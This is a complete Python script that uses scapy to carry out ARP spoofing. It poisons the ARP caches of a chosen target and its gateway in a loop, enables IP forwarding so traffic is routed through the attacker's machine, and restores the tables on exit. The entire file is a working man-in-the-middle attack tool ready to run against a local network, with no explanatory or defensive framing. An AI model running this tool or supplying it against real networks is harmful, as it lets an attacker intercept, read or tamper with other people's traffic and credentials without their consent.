#!usr/bin/evn python

import scapy.all as scapy
import optparse
import sys, time, os

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target-ip", dest="target_ip", help="Target IP for spoofing gateway.")
    parser.add_option("-g", "--gateway-ip", dest="gateway_ip", help="Gateway IP for spoofing Target.")
    (options, argument) = parser.parse_args()
    if not options.target_ip:
        parser.error("[-] Please specify an target_ip, use --help for more info.")
    elif not options.gateway_ip:
        parser.error("[-] Please specify an gateway_ip, use --help for more info.")
    return options

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

try:
    options = get_arguments()
    sent_packet_count = 0
    print("\n\033[0;31;40m[-] Exit from This proocess to Press Ctrl + C\n")
    os.system('sudo bash -c "echo 1 > /proc/sys/net/ipv4/ip_forward"')
    print("\033[0;33;40m[+] Spoofed Target IP Address : "+ str(options.target_ip) +"\n")
    while True:
        spoof(options.target_ip, options.gateway_ip)
        spoof(options.gateway_ip, options.target_ip)
        sent_packet_count += 1
        sys.stdout.write("\r\033[0;32;40m[+] Arp Spoofing: " + str(sent_packet_count)),
        #print("\r\033[0;32;40m[+] Arp Spoofing: " + str(sent_packet_count)),
        sys.stdout.flush()
        time.sleep(1)
except KeyboardInterrupt:
    print("\n\n\033[0;33;40m[+] Detected CTRL + C ...")
    
except IndexError:
    print("\n\n\033[0;33;40m[+] Target System meybe Shutdown...")
    
except:
    print("\n\n\033[0;33;40m[+] Some Error Occurred, Please Try Again ...")
    
finally:
    print("\n\033[0;33;40m[+] Resetting ARP tables...\n\n\033[0;31;40m[-] Exit from This proocess.\n")
    restore(options.target_ip, options.gateway_ip)
    restore(options.gateway_ip, options.target_ip)
    time.sleep(1)
    os.system('sudo bash -c "echo 0 > /proc/sys/net/ipv4/ip_forward"')
    time.sleep(2)
    os.system('exit')
